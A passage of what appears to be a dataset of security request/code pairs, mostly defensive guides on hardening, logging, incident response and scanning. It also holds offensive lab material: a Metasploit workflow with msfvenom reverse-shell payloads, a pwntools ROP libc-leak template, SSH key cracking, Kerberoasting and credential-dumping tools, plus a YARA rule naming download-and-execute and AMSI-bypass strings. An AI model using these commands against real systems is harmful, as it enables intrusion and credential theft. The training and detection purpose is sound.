ssh2john id_rsa > k.hash && john --wordlist=rockyou.txt k.hash""",
},

# ───────── Exploitation framework ─────────
{
    "request": "Metasploit basic workflow (authorized lab use)",
    "language": "bash", "framework": "pentest",
    "code": """# Start
msfconsole -q

# Database
msf6 > db_status
msf6 > workspace -a engagement1
msf6 > db_nmap -sV -p- 10.0.0.5
msf6 > services
msf6 > hosts
msf6 > vulns

# Find module
msf6 > search type:exploit platform:linux smb
msf6 > use exploit/linux/smb/eternalblue
msf6 > info
msf6 > show options

# Configure
msf6 > set RHOSTS 10.0.0.5
msf6 > set LHOST 10.0.0.10
msf6 > set payload linux/x64/meterpreter/reverse_tcp
msf6 > check
msf6 > run

# Meterpreter
meterpreter > sysinfo
meterpreter > getuid
meterpreter > shell
meterpreter > download /etc/passwd
meterpreter > background
msf6 > sessions -i 1

# msfvenom — payload generation
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.0.0.10 LPORT=443 -f exe -o payload.exe
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.10 LPORT=4444 -f elf -o sh.elf

# Use only on systems you own or have written authorization for (lab VMs, HTB, OSCP, engagements).""",
},

# ───────── Reverse engineering ─────────
{
    "request": "binary analysis — first-look toolkit",
    "language": "bash", "framework": "reverse-eng",
    "code": """# Identify
file ./bin
strings -n 8 ./bin | less                    # printable strings
xxd ./bin | head                             # raw bytes
nm ./bin                                     # symbols (if not stripped)
readelf -a ./bin                             # ELF metadata
objdump -d ./bin | less                      # disassembly
checksec --file=./bin                        # NX/PIE/Canary/RELRO

# Embedded files
binwalk ./bin
binwalk -e ./bin                             # extract
foremost -i disk.img                         # carve files

# Dynamic
ltrace ./bin                                 # library calls
strace ./bin                                 # syscalls
ldd ./bin                                    # shared libs

# Debugger (with pwndbg / GEF / pwngdb plugins)
gdb ./bin
  (gdb) info functions
  (gdb) b main
  (gdb) r
  (gdb) disas main
  (gdb) x/20wx $rsp

# Decompiler
ghidra        # NSA, free, headless mode for batch
r2 ./bin      # radare2 — `aaa` then `pdf @ main`
ida           # commercial""",
},
{
    "request": "pwntools template for binary exploitation (CTF)",
    "language": "py", "framework": "ctf",
    "code": """from pwn import *

context.binary = elf = ELF("./challenge")
context.log_level = "info"

LIBC = ELF("./libc.so.6")    # if provided

# local / remote
def conn():
    if args.REMOTE:
        return remote("ctf.example.com", 1337)
    if args.GDB:
        return gdb.debug([elf.path], gdbscript="b *main\\nc")
    return process([elf.path])

io = conn()

# Useful
rop = ROP(elf)
pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
ret    = rop.find_gadget(["ret"])[0]

payload  = b"A" * 40
payload += p64(ret)            # stack alignment
payload += p64(pop_rdi) + p64(elf.got["puts"])
payload += p64(elf.plt["puts"])
payload += p64(elf.symbols["main"])

io.sendlineafter(b"> ", payload)

# Leak puts → libc base
leak = u64(io.recvline().strip().ljust(8, b"\\x00"))
LIBC.address = leak - LIBC.symbols["puts"]
log.info("libc base: %#x", LIBC.address)

# Run with: python3 exp.py REMOTE   /  python3 exp.py GDB""",
},

# ───────── Container / k8s ─────────
{
    "request": "Docker image security — minimal hardening",
    "language": "dockerfile", "framework": "container-sec",
    "code": """# Use minimal, pinned, signed base
FROM python:3.12-slim@sha256:abc...    # pin by digest

# Don't run as root
RUN groupadd -r app && useradd -r -g app -s /sbin/nologin app
WORKDIR /app
COPY --chown=app:app requirements.txt .

# Build deps in separate stage
FROM python:3.12-slim AS build
RUN pip install --no-cache-dir --user -r requirements.txt

FROM python:3.12-slim
COPY --from=build /root/.local /home/app/.local
COPY --chown=app:app . /app
USER app
ENV PATH=/home/app/.local/bin:$PATH
EXPOSE 8000

# Read-only rootfs at runtime: docker run --read-only --tmpfs /tmp ...
# Drop caps:                  --cap-drop=ALL --cap-add=NET_BIND_SERVICE (only if needed)
# No new privs:               --security-opt=no-new-privileges
# Seccomp default:            (Docker enables by default)
# Healthcheck:                HEALTHCHECK CMD curl -f http://localhost:8000/health

HEALTHCHECK --interval=30s --timeout=3s CMD curl -f http://localhost:8000/health || exit 1

CMD ["python", "-m", "myapp"]

# Scan: trivy image myapp:latest    /    grype myapp:latest
# Sign: cosign sign --key cosign.key myreg/myapp:1.2.3""",
},
{
    "request": "Kubernetes pod security and NetworkPolicy",
    "language": "yaml", "framework": "container-sec",
    "code": """apiVersion: v1
kind: Pod
metadata:
  name: secure-app
spec:
  automountServiceAccountToken: false
  securityContext:
    runAsNonRoot: true
    runAsUser: 10001
    fsGroup: 10001
    seccompProfile: { type: RuntimeDefault }
  containers:
  - name: app
    image: myreg/app@sha256:...
    securityContext:
      allowPrivilegeEscalation: false
      readOnlyRootFilesystem: true
      capabilities: { drop: ["ALL"] }
    resources:
      limits:   { cpu: 500m, memory: 512Mi }
      requests: { cpu: 100m, memory: 128Mi }
    volumeMounts:
    - { name: tmp, mountPath: /tmp }
  volumes:
  - { name: tmp, emptyDir: {} }
---
# Default-deny + explicit allows
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: deny-all, namespace: prod }
spec:
  podSelector: {}
  policyTypes: [Ingress, Egress]
---
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata: { name: app-allow, namespace: prod }
spec:
  podSelector: { matchLabels: { app: api } }
  policyTypes: [Ingress, Egress]
  ingress:
  - from: [{ podSelector: { matchLabels: { app: web } } }]
    ports: [{ protocol: TCP, port: 8000 }]
  egress:
  - to: [{ podSelector: { matchLabels: { app: db } } }]
    ports: [{ protocol: TCP, port: 5432 }]
  - to: [{ namespaceSelector: { matchLabels: { name: kube-system } } }]
    ports: [{ protocol: UDP, port: 53 }]    # DNS

# Enforce policy at admission: Kyverno / OPA Gatekeeper
# Scan manifests:               kubescape / kube-bench / kube-hunter / checkov""",
},

# ───────── Cloud (AWS) ─────────
{
    "request": "AWS IAM least-privilege patterns",
    "language": "json", "framework": "cloud-sec",
    "code": """// Per-resource, per-action — never \"*:*\" in production
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Sid": "ReadOwnBucket",
      "Effect": "Allow",
      "Action": ["s3:GetObject"],
      "Resource": ["arn:aws:s3:::my-bucket/${aws:username}/*"]
    },
    {
      "Sid": "DenyUnencryptedWrites",
      "Effect": "Deny",
      "Action": "s3:PutObject",
      "Resource": "arn:aws:s3:::my-bucket/*",
      "Condition": { "StringNotEquals": { "s3:x-amz-server-side-encryption": "aws:kms" } }
    },
    {
      "Sid": "RequireMFAForSensitive",
      "Effect": "Deny",
      "Action": ["iam:*","kms:ScheduleKeyDeletion","s3:DeleteBucket"],
      "Resource": "*",
      "Condition": { "BoolIfExists": { "aws:MultiFactorAuthPresent": "false" } }
    }
  ]
}

// Patterns:
//   - Use roles + IRSA (EKS) / instance profiles — NOT static IAM users
//   - SCPs at org level for guardrails (e.g. deny region except us-east-1, deny IAM root)
//   - Permissions Boundary on dev-created roles
//   - Access Analyzer to find externally-shared resources
//   - CloudTrail org trail → S3 (locked, MFA-delete) → Athena/Glue queries
//   - GuardDuty + Security Hub + Inspector enabled in every account""",
},
{
    "request": "find AWS secrets in code / git history",
    "language": "bash", "framework": "cloud-sec",
    "code": """# Pre-commit: gitleaks (also github action)
gitleaks detect --source . -v
gitleaks protect --staged   # in pre-commit hook

# trufflehog — entropy + pattern + verifies live keys
trufflehog git file://.
trufflehog github --org=myorg --token=$GH_TOKEN

# Shipped secret response:
#   1. Rotate immediately (deactivate old key in AWS console / IAM)
#   2. Search CloudTrail for any use of the leaked key
#   3. Force-rewrite history: git filter-repo --invert-paths --path leaked.env
#      (WARNING: rewrites SHAs — coordinate with team. NEVER use git push --force unilaterally.)
#   4. Add the key to gitleaks rules so it can't be re-committed

# Prevent re-occurrence:
#   - SOPS / sealed-secrets / SealedSecret / age for repo-stored config
#   - AWS Secrets Manager / Parameter Store SecureString for runtime
#   - CI: check-secret-strings + gitleaks in PR pipeline""",
},

# ───────── Logging / SIEM ─────────
{
    "request": "what to log for security (and what NOT to log)",
    "language": "text", "framework": "blue-team",
    "code": """LOG (with timestamp, source IP, user/session, request id):
  - All authentication events (success + failure + reason)
  - Authorization denials (403s)
  - Account changes (password reset, MFA enrol/remove, email change, role change)
  - Privileged ops (admin actions, data export, key rotation)
  - Security-relevant config changes (firewall, IAM, secrets read)
  - Validation failures from edge (WAF blocks, rate-limit triggers)
  - All outbound network to non-corporate destinations (egress)
  - Process exec on servers (auditd execve / sysmon)

DO NOT LOG:
  - Passwords, secrets, API keys, session tokens, JWTs
  - Full credit card numbers, CVVs (PCI)
  - Health data without HIPAA-compliant pipeline
  - Full PII unless required & masked

Format: structured JSON, one event per line. Required fields:
  ts (RFC3339), level, service, env, host, request_id, user_id, action, outcome, details

Pipeline:
  app → stdout → fluent-bit / vector → Kafka → ES/OpenSearch / Loki / Splunk → SIEM rules

Retain ≥ 90 days hot, ≥ 1 yr warm, ≥ 7 yr cold for compliance domains.""",
},
{
    "request": "Sigma rule example and conversion",
    "language": "yaml", "framework": "blue-team",
    "code": """# Sigma = generic detection rule format. Convert to Splunk/ES/QRadar/Sentinel with sigmac.

title: Suspicious PowerShell Encoded Command
id: 4d7e2c5e-1234-4abc-9def-1234567890ab
status: experimental
description: Detects PowerShell run with -EncodedCommand (common malware)
author: blue-team
date: 2024/01/01
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    Image|endswith: '\\powershell.exe'
    CommandLine|contains:
      - '-EncodedCommand'
      - '-enc '
      - '-e '
  filter:
    CommandLine|contains: 'LegitInternalToolMarker'
  condition: selection and not filter
fields: [User, Image, CommandLine, ParentImage]
falsepositives: [Admin scripts that base64-encode args]
level: medium
tags:
  - attack.execution
  - attack.t1059.001

# Convert:
#   sigma convert -t splunk rule.yml
#   sigma convert -t esql -p windows-audit rule.yml""",
},

# ───────── IR ─────────
{
    "request": "incident response playbook (compromise of web server)",
    "language": "text", "framework": "blue-team",
    "code": """1. PRESERVE
   - Snapshot the VM / EBS volume BEFORE shutting down
   - Capture memory:        sudo apt install lime; lime → mem.lime  (or AVML on AWS)
   - Preserve logs offsite: copy /var/log, /var/audit, app logs, web access logs
   - Note exact timeline: discovery, first sign, last clean

2. CONTAIN
   - Network isolate (security group → deny all, or VPC NACL)
   - Don't power off if memory not yet captured
   - Rotate credentials the host had access to (IAM role, DB creds, API tokens)

3. ERADICATE
   - Identify entry vector — webshell? credential stuff? unpatched CVE?
   - Find ALL backdoors: cron, systemd timers, SSH authorized_keys, LD_PRELOAD,
     /etc/ld.so.preload, kernel modules (lsmod), suspicious user accounts (passwd/shadow)
   - Don't trust the box — wipe and rebuild from known-good image

4. RECOVER
   - Restore from clean backup
   - Patch the entry vector
   - Rotate ALL secrets (assume everything on the host is compromised)

5. LESSONS LEARNED
   - Timeline doc, root-cause, contributing factors, prevention items
   - Add detections for the TTPs observed
   - Run tabletop next quarter with similar scenario

References:
  - NIST 800-61 r2 (IR lifecycle)
  - SANS IR cheat sheets
  - github.com/certsocietegenerale/IRM (per-incident playbooks)""",
},
{
    "request": "Linux live triage — quick commands when investigating a host",
    "language": "bash", "framework": "blue-team",
    "code": """# Who, what, when
w; last -aiF | head -20; lastlog
ps -auxf
ss -tunap                 # connections
netstat -plntu            # listening
lsof -i -P -n
crontab -l; ls -la /etc/cron.* /var/spool/cron/
systemctl list-timers --all
systemctl list-units --type=service --state=running

# Persistence checks
ls -la /etc/init.d /etc/rc*.d /etc/systemd/system /usr/lib/systemd/system
grep -rE 'authorized_keys' /home /root 2>/dev/null
find / -newer /tmp/marker -mtime -1 2>/dev/null     # recently changed
find / -name '.*' -type f -size +1M 2>/dev/null     # large hidden files
find / -perm -4000 2>/dev/null                      # SUID
ldd /bin/ls                                         # any rogue lib?
cat /etc/ld.so.preload

# Users / accounts
awk -F: '$3==0' /etc/passwd                         # all uid 0
awk -F: '$2==""' /etc/shadow                        # blank-pw accounts
getent passwd | awk -F: '$3>=1000'

# Network artifacts
sudo tcpdump -i any -nn -s0 -c 200 -w /tmp/triage.pcap
cat /etc/hosts; cat /etc/resolv.conf; iptables -L -n -v

# Logs
journalctl -u sshd --since '24 hours ago'
zgrep -h 'Failed\|Accepted' /var/log/auth.log* | tail -200
last -F | head; last -fF /var/log/btmp | head

# Dump volatile state (memory, /proc)
gcore <pid>                                         # core dump of suspicious process
ls -l /proc/<pid>/exe; cat /proc/<pid>/cmdline
ls -l /proc/<pid>/cwd""",
},
{
    "request": "Volatility 3 — memory forensics common plugins",
    "language": "bash", "framework": "forensics",
    "code": """# Identify symbols (auto-detected)
vol -f mem.raw windows.info

# Process tree
vol -f mem.raw windows.pstree
vol -f mem.raw windows.psscan          # finds hidden/exited

# Network
vol -f mem.raw windows.netstat
vol -f mem.raw windows.netscan

# Injected code
vol -f mem.raw windows.malfind
vol -f mem.raw windows.hollowfind

# Loaded DLLs / drivers
vol -f mem.raw windows.dlllist --pid 1234
vol -f mem.raw windows.modules
vol -f mem.raw windows.driverirp

# Registry / persistence
vol -f mem.raw windows.registry.hivelist
vol -f mem.raw windows.registry.printkey --key 'Software\\Microsoft\\Windows\\CurrentVersion\\Run'

# Dump artifacts
vol -f mem.raw windows.pslist
vol -f mem.raw windows.dumpfiles --pid 1234
vol -f mem.raw windows.memmap --pid 1234 --dump

# Linux
vol -f mem.lime linux.bash
vol -f mem.lime linux.lsof
vol -f mem.lime linux.pslist""",
},
{
    "request": "YARA rule example for malware hunting",
    "language": "yara", "framework": "blue-team",
    "code": """rule SuspiciousPowerShellLoader
{
    meta:
        author      = "blue-team"
        date        = "2024-01-01"
        description = "Common PowerShell in-memory loader patterns"
        severity    = "medium"

    strings:
        $s1 = "FromBase64String"           ascii wide nocase
        $s2 = "[Reflection.Assembly]::Load" ascii wide nocase
        $s3 = "IEX (New-Object Net.WebClient).DownloadString" ascii wide nocase
        $s4 = "DownloadFile"               ascii wide nocase
        $s5 = "Invoke-Expression"          ascii wide nocase
        $hex_amsi_bypass = { 41 6D 73 69 53 63 61 6E 42 75 66 66 65 72 }   // "AmsiScanBuffer"

    condition:
        2 of ($s*) or $hex_amsi_bypass
}

# Run
yara -r rules.yar /path/to/scan
yara -s -r rules.yar /samples            # show matched strings

# At scale: thor-lite (Florian Roth), loki, fenrir
# Hunt in memory: yara -p 0 -r rules.yar  (all processes, with sufficient privs)""",
},

# ───────── Threat modeling ─────────
{
    "request": "STRIDE threat modeling cheat sheet",
    "language": "text", "framework": "appsec",
    "code": """STRIDE — per-asset / per-trust-boundary, ask:

S  Spoofing            → who is this really?       Mitigate: authn (MFA, mTLS, signed tokens)
T  Tampering           → has it been modified?     Mitigate: integrity (hashes, signatures, WORM)
R  Repudiation         → did they really do that?  Mitigate: audit logs (signed, append-only)
I  Information disc.   → can outsiders see it?     Mitigate: encryption, access control, redaction
D  Denial of service   → can I keep it up?         Mitigate: rate limiting, autoscale, queue, CDN
E  Elev. of privilege  → can they become admin?    Mitigate: least privilege, RBAC, separation of duties

Process:
  1. Diagram the system (data flow diagram with trust boundaries)
  2. Per element, walk STRIDE — list threats
  3. Score (DREAD or CVSS)
  4. Mitigate (design control), accept, or transfer (insurance)
  5. Re-review on architecture change

Tools: Microsoft Threat Modeling Tool, OWASP Threat Dragon, IriusRisk, pytm (code-driven).

Companion: LINDDUN for privacy threats, PASTA for risk-centric modeling.""",
},

# ───────── Bug bounty / responsible disclosure ─────────
{
    "request": "responsible disclosure — what a good report looks like",
    "language": "text", "framework": "appsec",
    "code": """Title: <vuln class> in <component> allows <impact>

Summary (2-3 sentences):
  Plain-language description for execs.

Severity: <CVSS 3.1 vector + score>

Affected:
  - URL / endpoint / version
  - Users / data exposed
  - Reproduction tested at <date / commit>

Steps to reproduce (numbered, copy-pasteable):
  1. Visit https://app.example.com/...
  2. Send the following request (curl / Burp export):
     ...
  3. Observe response: ...

Proof of concept:
  - Screenshots (redacted — no real user data)
  - Minimal HTTP request/response
  - Video if behavior is JS-driven

Impact:
  - What data / actions an attacker gains
  - Privilege required to exploit (none, user, admin)
  - Pre-conditions (logged in, MFA disabled, specific role)

Suggested fix:
  - Concrete code-level recommendation if known
  - Reference (OWASP cheat sheet, CWE-XXX)

Stay within program scope. Do not access more data than necessary to demonstrate.
Don't pivot. Don't exfiltrate. Don't perform DoS. Don't publish before disclosure window.

Programs: hackerone.com, bugcrowd.com, intigriti.com, github.com/disclose/diodb""",
},

# ───────── Phishing / awareness (defense) ─────────
{
    "request": "DMARC / SPF / DKIM email auth — minimal correct config",
    "language": "text", "framework": "email-sec",
    "code": """Goal: prevent attackers from spoofing your domain in phishing.

1. SPF — list servers allowed to send mail FROM your domain
   TXT @  "v=spf1 include:_spf.google.com include:mailgun.org -all"
   ("-all" = hard fail; "~all" = softfail. Use -all when you're confident.)

2. DKIM — outbound mail signed; receivers verify
   TXT selector1._domainkey  "v=DKIM1; k=rsa; p=MIGfMA0G..."
   (Provider gives you the public key. Rotate yearly.)

3. DMARC — policy + reporting on SPF/DKIM alignment failures
   TXT _dmarc  "v=DMARC1; p=reject; rua=mailto:dmarc@example.com; ruf=mailto:dmarc@example.com; fo=1; adkim=s; aspf=s; pct=100"
   - p=none → monitor only (start here)
   - p=quarantine → spam folder
   - p=reject → bounce
   Walk: none → quarantine → reject as you fix legit senders.

4. MTA-STS / TLS-RPT — force TLS on inbound
   TXT _mta-sts  "v=STSv1; id=20240101"
   And HTTPS https://mta-sts.example.com/.well-known/mta-sts.txt

5. BIMI (optional) — show your logo in mail clients (requires DMARC enforcement + VMC).

Test: dmarcian.com, mxtoolbox.com, https://www.checktls.com""",
},

# ───────── SAST / DAST / SCA ─────────
{
    "request": "semgrep — quick start for security scanning",
    "language": "bash", "framework": "appsec",
    "code": """# Install
pip install semgrep
# or:  brew install semgrep

# Run security registry rules
semgrep --config=p/security-audit ./src
semgrep --config=p/owasp-top-ten
semgrep --config=p/r2c-security-audit
semgrep --config=p/secrets

# Custom rule (rule.yml)
rules:
  - id: dangerous-eval
    pattern: eval(...)
    message: Avoid eval — RCE risk
    languages: [python, javascript]
    severity: ERROR

semgrep --config=rule.yml ./src

# CI / GitHub
# .github/workflows/semgrep.yml
#   uses: returntocorp/semgrep-action@v1
#   with: { config: p/security-audit, generateSarif: \"1\" }
# Then upload SARIF to GitHub code scanning.

# Auto-fix
semgrep --config=p/security-audit --autofix

# Other SAST: CodeQL (GitHub), Snyk Code, SonarQube, Bandit (Py), gosec (Go), brakeman (Rails)""",
},
{
    "request": "trivy / grype — dependency and image vulnerability scanning",
    "language": "bash", "framework": "appsec",
    "code": """# Trivy
trivy fs --severity HIGH,CRITICAL --ignore-unfixed .
trivy image myreg/app:1.2.3
trivy config ./terraform                 # IaC misconfig
trivy k8s --report summary cluster
trivy repo https://github.com/owner/repo
trivy sbom sbom.cdx.json

# Generate SBOM (for supply-chain provenance)
trivy image --format cyclonedx --output sbom.cdx.json myapp:1.2.3
syft myapp:1.2.3 -o spdx-json > sbom.spdx.json

# Grype (alternative scanner)
grype myapp:1.2.3
grype sbom:./sbom.cdx.json

# CI gate: fail on HIGH/CRITICAL with known fix
trivy image --exit-code 1 --severity HIGH,CRITICAL --ignore-unfixed myapp:$TAG

# osv-scanner for language ecosystems
osv-scanner --recursive ./""",
},

# ───────── Secrets management ─────────
{
    "request": "secrets management options compared",
    "language": "text", "framework": "appsec",
    "code": """RUNTIME (preferred for prod)
  AWS Secrets Manager / Parameter Store SecureString
    + automatic rotation (Lambda hooks)
    + IAM-scoped access
    - egress cost / latency
  GCP Secret Manager  / Azure Key Vault
  HashiCorp Vault — most flexible (dynamic creds, transit encryption, K/V), self-host or HCP

  In code: fetch on startup AND on demand; cache with TTL; subscribe to rotation events.

REPO-STORED (for non-prod, configuration-as-code)
  SOPS  + age or KMS — encrypted YAML/JSON in git, decrypted by CI/operator
  git-crypt — transparent, less granular
  Sealed Secrets (k8s) — encrypted to cluster pubkey
  ESO (External Secrets Operator) — sync from real secret store into k8s Secrets

DEV
  direnv + .envrc.encrypted (sops-pre-hook)
  1Password CLI: op run --env-file=.env -- npm start

NEVER
  - secrets in env vars exposed in /proc/<pid>/environ to other users
  - secrets in CLI args (visible in ps)
  - secrets in container image layers (dive / docker history)
  - secrets in CI logs (use ::add-mask:: in GH Actions)""",
},

# ───────── Vuln research / disclosure ─────────
{
    "request": "CVE numbering and CVSS scoring",
    "language": "text", "framework": "appsec",
    "code": """CVE = unique ID (CVE-YYYY-NNNNN) for a vulnerability.
Issued by CNAs (CVE Numbering Authorities — vendors, MITRE, GitHub, etc.)

Pipeline:
  Reporter → CNA → CVE assigned → NVD enriches → score + CWE + CPE published

CVSS 3.1 base vector:
  AV  Attack Vector       N=Network  A=Adjacent  L=Local  P=Physical
  AC  Attack Complexity   L=Low      H=High
  PR  Privileges Req      N=None     L=Low       H=High
  UI  User Interaction    N=None     R=Required
  S   Scope               U=Unchanged C=Changed
  C/I/A  Impact           N=None     L=Low       H=High

Critical (≥9.0): unauth RCE on internet-facing
High    (7.0-8.9)
Medium  (4.0-6.9)
Low     (0.1-3.9)

Use CVSS-BT (with temporal: exploit maturity, remediation level, report confidence)
and Environmental for actual prioritization in your environment.

Better: EPSS (probability of exploitation in next 30d) — first.org/epss
Combine: high CVSS + high EPSS + internet-exposed = patch first.""",
},

# ───────── CTF / OSINT ─────────
{
    "request": "CTF tooling by category",
    "language": "text", "framework": "ctf",
    "code": """WEB
  Burp / ZAP, ffuf, sqlmap, jwt_tool, hashcat, nosqlmap, ParamMiner

CRYPTO
  CyberChef, sage, openssl, RsaCtfTool, hashID, factordb.com

REVERSE / PWN
  Ghidra, IDA Free, radare2/iaito, gdb+pwndbg, pwntools, ROPgadget, one_gadget,
  angr (symbolic), unicorn, qiling

FORENSICS
  Wireshark, NetworkMiner, volatility3, autopsy, binwalk, foremost, exiftool,
  steghide, zsteg, stegseek, aperisolve.fr, aperture

OSINT
  theHarvester, amass, subfinder, httpx, gau, waybackurls, sherlock,
  tineye / google reverse image, shodan.io, censys.io, crt.sh

MISC / RECON
  hashcat / john, ssh-audit, curl, jq, hxd, bless

TOOLBOXES
  pwntools, kali / parrot OS, github.com/zardus/ctf-tools

PRACTICE
  picoctf.org (beginner), htb.com (intermediate+), cryptohack.org,
  pwnable.kr, pwnable.tw, ringzer0ctf.com, ctftime.org (live events)""",
},
{
    "request": "OSINT techniques — passive recon",
    "language": "bash", "framework": "osint",
    "code": """# Passive (no traffic to target)

# Subdomain enumeration
amass enum -passive -d example.com
subfinder -d example.com -all
assetfinder example.com
crt.sh: curl -s "https://crt.sh/?q=%25.example.com&output=json" | jq -r '.[].name_value' | sort -u

# Wayback / archives
gau example.com
waybackurls example.com
# manual: web.archive.org/web/*/example.com/*

# Cert transparency
curl -s "https://crt.sh/?q=example.com&output=json" | jq

# Search engines (Google dorks)
# site:example.com filetype:pdf "confidential"
# site:example.com inurl:admin
# intitle:"index of" site:example.com

# Code search
# github.com/search?q=org:example+AKIA   (AWS access keys)
# grep.app, sourcegraph.com

# Internet-wide indexes
shodan search "ssl:example.com" --fields ip_str,port,product
censys search "services.tls.certificates.leaf_data.subject.common_name: example.com"

# People
sherlock username
holehe email@example.com         # which sites have account
hibp.com (Have I Been Pwned)

# Always passive in initial recon. Active scanning requires authorization.""",
},

# ───────── Active Directory / Windows ─────────
{
    "request": "Active Directory enumeration tools (authorized engagements)",
    "language": "text", "framework": "pentest",
    "code": """ENUM (post-foothold, low priv)
  bloodhound + sharphound — graph the AD attack paths, find shortest path to DA
  ldapsearch / ldapdomaindump
  PowerView (PowerShell) — Get-Domain*, Get-NetUser, Find-LocalAdminAccess
  net.exe user /domain, net group "Domain Admins" /domain
  AdExplorer (Sysinternals) — UI snapshot

KERBEROS
  Rubeus / impacket
    GetUserSPNs.py    → kerberoast (req SPNs, crack offline as TGS-REP, mode 13100)
    GetNPUsers.py     → AS-REP roast (no preauth users, mode 18200)
    secretsdump.py    → dump SAM/LSA/NTDS (with admin)
    lsadump.py
    psexec.py / wmiexec.py / smbexec.py

LATERAL
  CrackMapExec / NetExec — sweep credentials across hosts
  evil-winrm — interactive WinRM shell
  rdesktop / xfreerdp / Remmina

OPSEC
  - Watch out for ETW, Sysmon, EDR — many of the above are loud
  - SOC catches these by default with MDE/CrowdStrike

REMEMBER: only against AD environments you own (lab, HTB, OSCP) or have written engagement scope.""",
},
{
    "request": "Windows hardening highlights",
    "language": "text", "framework": "host-sec",
    "code": """ACCOUNTS
  - Local admin password mgmt: LAPS (per-machine random local-admin pw)
  - Disable / rename built-in Administrator
  - Tier 0/1/2 model for admin accounts (DA only on DCs, never RDP to workstations)
  - MFA for all admins (Smartcard / FIDO2 / WHfB)

ATTACK SURFACE
  - SMBv1 disabled (Set-SmbServerConfiguration -EnableSMB1Protocol $false)
  - LLMNR / NBT-NS / mDNS disabled (kills Responder relay)
  - Print Spooler disabled where not needed (PrintNightmare class)
  - WDAC / AppLocker — code integrity, allowlist

IDENTITY
  - Credential Guard (VBS — protects LSA secrets)
  - LSA Protection (RunAsPPL)
  - Constrained delegation, NOT unconstrained
  - Disable NTLM where possible; require Kerberos
  - Protected Users group for sensitive accounts

DETECT
  - Sysmon (with @SwiftOnSecurity config) → Event Hub / SIEM
  - PowerShell ScriptBlock + Module logging + Transcription
  - Defender for Endpoint / 3rd-party EDR

PATCH
  - WSUS / Intune / SCCM, deploy critical within 7 days, all within 30
  - Test ring → broad ring → all

REFERENCE
  - CIS Microsoft Windows benchmarks
  - STIGs (DISA)
  - Microsoft Security Compliance Toolkit (Policy Analyzer + LGPO)""",
},

# ───────── DevSecOps ─────────
{
    "request": "secure CI/CD pipeline checklist",
    "language": "text", "framework": "devsecops",
    "code": """SOURCE
  ☐ Branch protection: required reviews, signed commits, no force push to main
  ☐ Secret scanning (GitHub native + gitleaks pre-commit)
  ☐ CODEOWNERS + required approvals from owners

BUILD
  ☐ Pinned action versions by SHA, not @main / @v1
  ☐ Minimal token permissions (permissions: contents: read; id-token: write only when needed)
  ☐ OIDC to cloud (no long-lived AWS keys in repo secrets)
  ☐ Hermetic / reproducible builds where possible
  ☐ Dependency lockfiles committed; renovate/dependabot enabled

TEST
  ☐ SAST (semgrep / CodeQL) — block on HIGH
  ☐ SCA (trivy / grype / osv-scanner) — block on KEV/known-exploited
  ☐ Secret scan on full diff
  ☐ License compliance check
  ☐ Container scan post-build, pre-push

ARTIFACT
  ☐ Sign images (cosign) → store signature in registry
  ☐ Generate SBOM (syft) → attach to release
  ☐ Generate SLSA provenance attestation
  ☐ Push to private registry with immutable tags

DEPLOY
  ☐ Verify signature at admission (cosign-policy / Kyverno verify-images)
  ☐ Progressive delivery (canary, feature flags, automated rollback on SLO breach)
  ☐ Read-only filesystem, non-root container
  ☐ Network policy default-deny

RUNTIME
  ☐ Falco / Tetragon for syscall anomalies
  ☐ Centralized logs to SIEM
  ☐ Patch SLAs with auto-rebuild on base-image CVE""",
},

# ───────── Email / phishing simulation ─────────
{
    "request": "phishing-resistant authentication",
    "language": "text", "framework": "auth",
    "code": """Goal: even if user enters their password into a fake site, attacker can't log in.

PHISHING-RESISTANT (origin-bound):
  - FIDO2 / WebAuthn / Passkeys (security keys, platform authenticators)
  - Smart cards / PIV / CAC
  - Windows Hello for Business

NOT phishing-resistant:
  - SMS OTP (sim-swap, real-time relay)
  - TOTP apps (Google Authenticator) — relayed by evilginx in real time
  - Push approval (MFA fatigue)
  - Phone call / voice OTP

Why WebAuthn works:
  - Browser binds the assertion to the origin (RP ID)
  - Attacker's fake site has a different origin → key won't sign for it

Implementation:
  - Server: SimpleWebAuthn (Node), webauthn4j (Java), py_webauthn (Py)
  - Require user verification (UV=required) for sensitive ops
  - Allow multiple keys per user (loss / 2nd device)
  - Recovery: backup codes + admin-verified reset (don't fall back to SMS)

Microsoft / Google / GitHub all support phishing-resistant MFA enforcement org-wide.
Move admin accounts first.""",
},

# ───────── Misc patterns ─────────
{
    "request": "rate limiting and brute-force protection",
    "language": "py", "framework": "appsec",
    "code": """# Token bucket per IP+account, with progressive delay
import time, redis
r = redis.Redis()

def check_login_attempt(ip, email):
    keys = [f"rl:ip:{ip}", f"rl:user:{email}"]
    for k in keys:
        n = r.incr(k)
        if n == 1: r.expire(k, 900)         # 15 min window
        if n > 10:                          # >10 attempts/15min
            ttl = r.ttl(k)
            raise RateLimited(retry_after=ttl)

# Better: failure-only counter + exponential backoff
def login(ip, email, pw):
    fk = f"fail:user:{email}"
    fails = int(r.get(fk) or 0)
    if fails >= 5:
        delay = min(2 ** (fails - 5), 60)   # 1s, 2s, 4s, 8s, ... 60s
        time.sleep(delay)
    if fails >= 20:
        raise AccountLocked()

    if not verify_password(email, pw):
        n = r.incr(fk); r.expire(fk, 3600)
        if n == 5: notify_user(email, "Multiple failed logins")
        raise InvalidCreds()
    r.delete(fk)
    return issue_session(email)

# At edge: Cloudflare / nginx limit_req, AWS WAF rate-based rules.
# CAPTCHA only after suspicious signal — not for every user (accessibility).
# Consider: device fingerprint, geo deltas, impossible travel.""",
},
{
    "request": "deserialization safely (and the unsafe ones to avoid)",
    "language": "text", "framework": "appsec",
    "code": """UNSAFE — accepting these from untrusted input lets attacker run code:
  Python:  pickle, marshal, shelve, pyyaml.load (without SafeLoader), jsonpickle
  Java:    ObjectInputStream / readObject (gadget chains via ysoserial)
  PHP:     unserialize()
  .NET:    BinaryFormatter (deprecated for a reason), NetDataContractSerializer
  Ruby:    Marshal.load, YAML.load (use safe_load)
  Node:    eval, Function constructor, vm without strict isolation, node-serialize

SAFE alternatives:
  - JSON  (no code execution by spec)
  - Protocol Buffers / Cap'n Proto / FlatBuffers / MessagePack
  - YAML with safe loader (yaml.safe_load in Py, snakeyaml SafeConstructor in Java)
  - Signed payloads if you must accept rich objects (HMAC the bytes, verify, then parse)

If you MUST use a powerful format:
